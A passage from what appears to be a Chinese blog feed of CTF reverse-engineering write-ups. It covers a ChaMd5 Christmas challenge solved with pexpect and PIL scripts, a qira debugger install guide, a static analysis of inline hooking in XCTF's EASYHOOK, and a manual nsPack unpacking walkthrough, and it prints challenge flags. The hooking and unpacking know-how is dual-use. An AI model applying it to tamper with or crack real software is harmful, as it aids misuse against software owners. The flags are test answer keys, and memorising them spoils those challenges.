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&#x27;</span></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">fn = raw_input()</span><br><span class="line">md5.update(fn)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;4a47a0db6e60853dedfcfdf08a5ca249&#x27;</span> == md5.hexdigest():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Are you robot?&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;25 + 3 = ?&#x27;</span></span><br><span class="line">    ans = <span class="built_in">int</span>(raw_input())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(ans) == <span class="number">28</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            md5 = hashlib.md5()</span><br><span class="line">            inp = <span class="built_in">str</span>(<span class="built_in">int</span>(ans))</span><br><span class="line">            md5.update(inp)</span><br><span class="line">            password = md5.hexdigest()</span><br><span class="line">            encrypt_data = base64.b64decode(encrypt_data)</span><br><span class="line">            decrypt_data = decrypt(encrypt_data, password)</span><br><span class="line">            f = <span class="built_in">open</span>(fn, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            f.write(decrypt_data)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>可以看到，逻辑是先输入一个字符串，第一个check是md5值等于一个已给值（通过chamd5的网站查到该md5值为1.png，突然扣题？hhh），第二个check是简单的人机测试，都通过的话就会输出一张<code>1.png</code>的图片。</p><p>这个地方的批量处理是我卡得最最最最最最久的一个地方 TvT</p><p>因为bat完全是现学，不会写，于是想到用python进行跟命令行的交互。</p><p>一开始查到的资料是用subprocess，但是读输出的时候死活读不进去（因为要过人机测试就得把式子读进去），去查subprocess文档没什么头绪，往后查又说是什么输出流阻塞balabala，总之没太看懂（tcl</p><p>后来好不容易看到有一篇提到说用pexpect。然后查了一些文档，诶，居然交互成功了！暴风哭泣！</p><p>理论上说前面用bat写的地方都可以改成用pexpect写，不过这不是之前还不知道嘛(。)</p><blockquote><p>以及，多亏这里搞通了，后面xctf刚好遇到一道逆向是可以用这种命令行交互爆破的（不是pwntools能连上的那种特殊架构文件），直接拿脚本改改就能用，省了几个小时的搜索时间hhh。</p></blockquote><p>于是开始写脚本进行多次交互啦，逻辑很简单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    r=pexpect.spawn(<span class="string">&quot;python2&quot;</span>,[<span class="built_in">str</span>(i)+<span class="string">&quot;.py&quot;</span>])</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(i)+<span class="string">&quot;.png&quot;</span>)</span><br><span class="line">    r.readline()</span><br><span class="line">    r.readline()</span><br><span class="line">    exper=r.readline()[:<span class="number">-6</span>]</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(exper)))</span><br><span class="line">    r.wait()</span><br></pre></td></tr></table></figure><p>得到59个png。</p><p><img src="/p/wpFor-2020chamd5XMAS/image-20201225234059324.png"></p><h1 id="python连接png"><a href="#python连接png" class="headerlink" title="python连接png"></a>python连接png</h1><p>当时做的时候因为懒得搞图像识别，所以直接手动记录这些图片上的字符。后来受到官方上发的wp的启发，感觉可以把这些png用PIL库连起来，就不用一张张点着看了。</p><p>这里我是把每个图片最左边6px提取出来横向拼接成一张图片，方便照着打hhh，调整了一下让字符大概居中排列（因为原图背景是透明的，所以这里提取出来就成黑的了&#x3D; &#x3D;。</p><p>png连接脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line">base=<span class="number">6</span></span><br><span class="line">colorData=[[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(base*<span class="number">59</span>)]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    img=Image.<span class="built_in">open</span>(<span class="built_in">str</span>(x)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    rgb_img=img.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">    width,height=img.size</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(base):</span><br><span class="line">        col=i+cnt*base</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            colorData[col].append(rgb_img.getpixel((i,j)))</span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">widthALL=<span class="built_in">len</span>(colorData)</span><br><span class="line">heightALL=<span class="built_in">max</span>([<span class="built_in">len</span>(arr) <span class="keyword">for</span> arr <span class="keyword">in</span> colorData])</span><br><span class="line">imgALL=Image.new(<span class="string">&quot;RGB&quot;</span>,(widthALL,heightALL))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(widthALL):</span><br><span class="line">    h=<span class="built_in">len</span>(colorData[i])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        imgALL.putpixel([i,(heightALL-h)//<span class="number">2</span>+j],colorData[i][j])</span><br><span class="line">imgALL.save(<span class="string">&quot;res.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2020chamd5XMAS/res-1609171302094.png" alt="res"></p><p>通过观察可以发现，有用的字符都为红&#x2F;绿&#x2F;蓝的纯色，于是在脚本上做一些改进，把符合条件的像素点置黑，其余置白，更方便观察。</p><p>最后改进的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line">base=<span class="number">6</span></span><br><span class="line">RED=(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">GREEN=(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>)</span><br><span class="line">BLUE=(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>)</span><br><span class="line">BLACK=(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">WHITE=(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>)</span><br><span class="line">colorData=[[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(base*<span class="number">59</span>)]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    img=Image.<span class="built_in">open</span>(<span class="built_in">str</span>(x)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    rgb_img=img.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">    width,height=img.size</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(base):</span><br><span class="line">        col=i+cnt*base</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            <span class="keyword">if</span> rgb_img.getpixel((i,j)) <span class="keyword">in</span> [RED,GREEN,BLUE]:</span><br><span class="line">                colorData[col].append(BLACK)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                colorData[col].append(WHITE)</span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">widthALL=<span class="built_in">len</span>(colorData)</span><br><span class="line">heightALL=<span class="built_in">max</span>([<span class="built_in">len</span>(arr) <span class="keyword">for</span> arr <span class="keyword">in</span> colorData])</span><br><span class="line">imgALL=Image.new(<span class="string">&quot;RGB&quot;</span>,(widthALL,heightALL))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(widthALL):</span><br><span class="line">    h=<span class="built_in">len</span>(colorData[i])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        imgALL.putpixel([i,(heightALL-h)//<span class="number">2</span>+j],colorData[i][j])</span><br><span class="line">imgALL.save(<span class="string">&quot;res.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2020chamd5XMAS/res-1609177656819.png" alt="res"></p><p>轻松记录下59个字符：<code>https://www.chamd5.org/e1f10acc44f611ebb3780242ac130002.png</code></p><p>打开有</p><p><img src="/p/wpFor-2020chamd5XMAS/image-20201225234200567.png"></p><h1 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h1><p><strong>flag{ChaMd5_Ch33r_Up}</strong></p><p><del>没想到这么晚交还水了个第三哈哈哈，溜了溜了（</del></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【从无到有】qira在Ubuntu 18.04下的安装&amp;使用</title>
      <link href="p/toolsOf-Qira-on-ubuntu-1804/"/>
      <url>p/toolsOf-Qira-on-ubuntu-1804/</url>
      
        <content type="html"><![CDATA[<p>有大佬安利了qira这款可回溯的调试器，于是试图在wsl上装（ubuntu 18.04），无奈在18.04上安装时的报错基本没找到什么有效的解决方法（甚至还找到明确说18.04装不了的说法），又懒得装16.04，于是只好试图自己摸索解决问题，幸好通过硬看源码解决了各种坑hhhh。</p><a id="more"></a><blockquote><p>环境：WSL2(ubuntu 18.04)</p></blockquote><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>直接跟着<a href="http://www.qira.me/">qira官网</a>里提供的安装输入即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/ &amp;&amp; wget -qO- https://github.com/geohot/qira/archive/v1.3.tar.gz | tar zx &amp;&amp; cd qira-1.3 &amp;&amp; ./install.sh</span><br></pre></td></tr></table></figure><p>当然传说中必不可能装上的18.04并不会这么简单（。</p><p>在走<code>./install.sh</code>这一步的时候就会开始踩坑了。</p><h1 id="修改文件避坑"><a href="#修改文件避坑" class="headerlink" title="修改文件避坑"></a>修改文件避坑</h1><p>配置文件修改commit：<a href="https://github.com/c10udlnk/someFixedConfigs/commit/c42a3b7932167a93659a33e0831f6bed3b62fe71">修改qira配置文件 · c10udlnk&#x2F;someFixedConfigs@c42a3b7</a></p><h2 id="报错static-declaration-of-‘memfd-create’-follows-non-static-declaration"><a href="#报错static-declaration-of-‘memfd-create’-follows-non-static-declaration" class="headerlink" title="报错static declaration of ‘memfd_create’ follows non-static declaration"></a>报错static declaration of ‘memfd_create’ follows non-static declaration</h2><p>按链接的上半部分修改qira-1.3&#x2F;tracers&#x2F;qemu&#x2F;qemu-2.5.1&#x2F;util&#x2F;memfd.c文件，再次运行<code>./install.sh</code>。</p><p><img src="/p/toolsOf-Qira-on-ubuntu-1804/image-20201219211606600.png"></p><h2 id="报错dereferencing-pointer-to-incomplete-type-‘struct-ucontext’"><a href="#报错dereferencing-pointer-to-incomplete-type-‘struct-ucontext’" class="headerlink" title="报错dereferencing pointer to incomplete type ‘struct ucontext’"></a>报错dereferencing pointer to incomplete type ‘struct ucontext’</h2><p>按链接的下半部分修改qira-1.3&#x2F;tracers&#x2F;qemu&#x2F;qemu-2.5.1&#x2F;user-exec.c文件，再次运行<code>./install.sh</code>。</p><p><img src="/p/toolsOf-Qira-on-ubuntu-1804/image-20201219211545769.png"></p><h1 id="使用参考"><a href="#使用参考" class="headerlink" title="使用参考"></a>使用参考</h1><ul><li><a href="http://www.qira.me/">qira官网</a></li><li><a href="https://www.jianshu.com/p/bb1e4d913cf1">ida+qira 记录 - 简书</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> zero2one/入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RE套路/从EASYHOOK学inline hook</title>
      <link href="p/reSkillsOn-Inline-hook/"/>
      <url>p/reSkillsOn-Inline-hook/</url>
      
        <content type="html"><![CDATA[<p>本文通过攻防世界Reverse答题进阶区的一道EASYHOOK，大致了解一下inline hook的流程。</p><p>P.S. 查了一下wp大多是直接动态调试看的&#x3D; &#x3D;，感觉并不能很深刻地理解hook。看流程其实有两个方法，除了动态识别流程以外，还可以静态分析流程（虽然比较麻烦但能更容易理解？实战的时候还是直接动调吧）。</p><p>P.S.S. 本文并非wp，只是记录关键hook部分罢了。</p><a id="more"></a><blockquote><p>例题：<a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4664&page=2">EASYHOOK</a></p><p>环境及工具：win10 + IDA pro</p></blockquote><p>IDA打开，查看主函数流程。</p><p><img src="/p/reSkillsOn-Inline-hook/image-20201216205542826.png"></p><p>（这里sub_401370可以猜测是输出函数，改名为itsPrint）。</p><p>流程大致是：判断输入字符串Buffer长度是否为19，然后走sub_401220()，一路走下来，最后要令NumberOfBytesWritten&#x3D;&#x3D;1，那么输入就是flag。</p><p>一般静态看的话很容易忽略前面的处理函数直接去看sub_401240()，然后发现一无所获（sub_401240()是个烟雾弹函数hhh）。</p><p><img src="/p/reSkillsOn-Inline-hook/image-20201216205937874.png"></p><p>回头，从sub_401220()看起，发现另有乾坤。</p><p><img src="/p/reSkillsOn-Inline-hook/image-20201216210105852.png"></p><p>我们可以关注到这个dword_40C9C4和lpAddress</p><p><img src="/p/reSkillsOn-Inline-hook/image-20201216210211428.png"></p><p>实际上是用来存储WriteFile()的地址，就是即将被hook的函数地址（主函数中这个函数在烟雾弹函数sub_401240()前面一行）。</p><p><img src="/p/reSkillsOn-Inline-hook/image-20201216210314334.png"></p><p>然后看到下面</p><p><img src="/p/reSkillsOn-Inline-hook/image-20201216212412188.png"></p><p>-23转成十六进制是0xE9，敏感地注意到这个为jmp的机器码。</p><p>而dword_40C9BD的计算方式跟jmp偏移地址的计算方式十分类似。</p><p>即<strong>偏移地址&#x3D;目标地址-当前地址-5</strong>。（5为E9 xxxxxxxx这条指令的长度）</p><p>同时！这两个关键变量在内存上还是连续的！</p><p><img src="/p/reSkillsOn-Inline-hook/image-20201216212707654.png"></p><p>这说明这里很有可能存放着用来hook的跳板指令，用于跳转到sub_401080()。</p><p>我们将这里改成aHook1和aHook2。</p><p>继续往下走，是return语句调用的sub_4010D0()函数。</p><p><img src="/p/reSkillsOn-Inline-hook/image-20201216212927416.png"></p><p>在这里我们可以看到，对lpAddress所存储的地址处进行了5字节的权限修改操作，先改成读写再往此处写入以aHook1开头的5个字节（即上面的跳板指令），最后恢复权限，完成修改。</p><p><img src="/p/reSkillsOn-Inline-hook/image-20201216212945232.png"></p><p>现在程序流程就很明朗了，粗略来看程序流程是CreateFileA-&gt;(lpAddress里存的指令)WriteFile-&gt;sub_401240，但是在经过sub_401220()的处理以后，变成了CreateFileA-&gt;(lpAddress里存的指令)sub_401080-&gt;sub_401240。</p><p>所以！真正的加密函数，其实是——sub_401080()！</p><p>于是exp就可以写出来啦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dst=[<span class="number">0x61</span>, <span class="number">0x6A</span>, <span class="number">0x79</span>, <span class="number">0x67</span>, <span class="number">0x6B</span>, <span class="number">0x46</span>, <span class="number">0x6D</span>, <span class="number">0x2E</span>, <span class="number">0x7F</span>, <span class="number">0x5F</span>, <span class="number">0x7E</span>, <span class="number">0x2D</span>, <span class="number">0x53</span>, <span class="number">0x56</span>, <span class="number">0x7B</span>, <span class="number">0x38</span>, <span class="number">0x6D</span>, <span class="number">0x4C</span>, <span class="number">0x6E</span>]</span><br><span class="line">flag=<span class="built_in">list</span>(<span class="string">&quot;-------------------&quot;</span>)</span><br><span class="line">flag[<span class="number">-1</span>]=<span class="built_in">chr</span>(dst[<span class="number">18</span>]^<span class="number">0x13</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    tmp=dst[i]^i</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">1</span>:</span><br><span class="line">        flag[i]=<span class="built_in">chr</span>(tmp+i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag[i+<span class="number">2</span>]=<span class="built_in">chr</span>(tmp)</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure><p><img src="/p/reSkillsOn-Inline-hook/image-20201219221444290.png"></p><p>只看加密函数的话第一位其实是被丢失了的(。)，可能是在哪里有保存吧没看到，不过很容易猜到是’f’啦。</p>]]></content>
      
      
      <categories>
          
          <category> Skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> u5eful </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RE套路/从crackme学nsPack手动脱壳</title>
      <link href="p/reSkillsOn-Unpack-from-nsPack/"/>
      <url>p/reSkillsOn-Unpack-from-nsPack/</url>
      
        <content type="html"><![CDATA[<p>刷题总得学到什么，不能刷完就忘了怎么做了（。），于是有了这个RE套路的子系列——从例题学技巧。</p><p>本文通过攻防世界Reverse答题进阶区的一道crackme，记录nsPack北斗壳的手工脱壳流程。</p><a id="more"></a><blockquote><p>例题：<a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4966&page=2">crackme</a></p><p>环境及工具：win10(vmware) + ExEinfoPE + OllyDBG + PE Tools + ImportREC</p><p>参考链接：<a href="https://blog.csdn.net/qq_42967398/article/details/94761189">nSPack 手工脱壳过程_A_dmin的博客-CSDN博客</a></p></blockquote><h1 id="日常第一步查壳"><a href="#日常第一步查壳" class="headerlink" title="日常第一步查壳"></a>日常第一步查壳</h1><p>用ExEinfoPE打开，显而易见是nsPack壳，于是打开虚拟机使用OD脱壳（OD扔虚拟机上了）。</p><p><img src="/p/reSkillsOn-Unpack-from-nsPack/image-20201216192612131.png"></p><p>P.S. 如果直接用IDA打开会报错<code>Truncated section &#39;.nsp1&#39; at file offsets 0x400..0x1A00; Will read 0x1445 bytes</code>和这个↓</p><p><img src="/p/reSkillsOn-Unpack-from-nsPack/image-20201216193158740.png"></p><p><code>The imports segment seems to be destroyed. This MAY mean that the file was packed or otherwise modified in order to make it more difficult to analyze. If you want to see the imports segment in the original form, please reload it with the &#39;make imports section&#39; checkbox cleared.</code></p><p>这时候就要警惕有壳了。</p><h1 id="OD打开寻找OEP"><a href="#OD打开寻找OEP" class="headerlink" title="OD打开寻找OEP"></a>OD打开寻找OEP</h1><blockquote><p>脱壳原理为ESP定律（即堆栈平衡定律），是应用频率最高的脱壳方法之一，详情指路 -&gt; <a href="https://www.freebuf.com/column/231580.html">ESP定律原理详解 - FreeBuf网络安全行业门户</a>。</p></blockquote><p>将crackme.exe用OD打开</p><p><img src="/p/reSkillsOn-Unpack-from-nsPack/image-20201216194654748.png"></p><p>F8单步执行，可以看到只有ESP和EIP发生了变化。</p><p><img src="/p/reSkillsOn-Unpack-from-nsPack/image-20201216194754284.png"></p><p>在ESP地址处右键-&gt;HW break[ESP]，下硬件断点，这样程序再次访问0x0019FF70内存地址时程序会抛出异常暂停运行（具体原理看上面的ESP定律）。简单来说就是程序加载时会用push将当前状态保存在栈中，这时已执行<code>pushfd</code>，ESP指向栈顶元素，于是在下次访问该内存地址时，就是执行<code>popfd</code>之后。</p><p><img src="/p/reSkillsOn-Unpack-from-nsPack/image-20201216200103948.png"></p><p>所以在按下F9时，程序会停在这里。</p><p><img src="/p/reSkillsOn-Unpack-from-nsPack/image-20201216200851737.png"></p><p>这里是一个跳转语句，根据北斗的特性可知这里跳转到了OEP，即程序真正的入口，按F7步入，并记住该地址（0x00401336），后面有用。</p><p><img src="/p/reSkillsOn-Unpack-from-nsPack/image-20201216201053418.png"></p><h1 id="dump内存"><a href="#dump内存" class="headerlink" title="dump内存"></a>dump内存</h1><p>OD不要关（整个脱壳步骤结束以后才可以关），打开PE Tools来dump内存（注意要以管理员身份运行，不然读不到正在调试中的crackme.exe）。找到该文件右键-&gt;Dump Full-&gt;保存，此时可以在文件同名目录下看到Dumped.exe。</p><p><img src="/p/reSkillsOn-Unpack-from-nsPack/image-20201216201531388.png"></p><p><img src="/p/reSkillsOn-Unpack-from-nsPack/image-20201216201713462.png"></p><h1 id="修复IAT"><a href="#修复IAT" class="headerlink" title="修复IAT"></a>修复IAT</h1><p>这个就是脱壳后的程序，但是不能正常运行，所以我们需要修复IAT。</p><p>打开ImportREC（同样要以管理员身份运行），依次进行：</p><ol><li>附加活动进程（找到正在调试中的crackme.exe）。</li><li>填入OEP（即上面记住的地址0x00401336-基地址0x00400000&#x3D;0x00001336，基地址为底部记录中的“映像基地址”）。</li><li>点“自动搜索”。</li><li>点“获取输入表”。</li><li>点“修复转存文件”-&gt;选择Dumped.exe-&gt;打开。</li></ol><p><img src="/p/reSkillsOn-Unpack-from-nsPack/image-20201216202501062.png"></p><p>此时文件夹中生成Dumped_.exe，此为<strong>最终脱壳后可运行的程序</strong>。</p><p><img 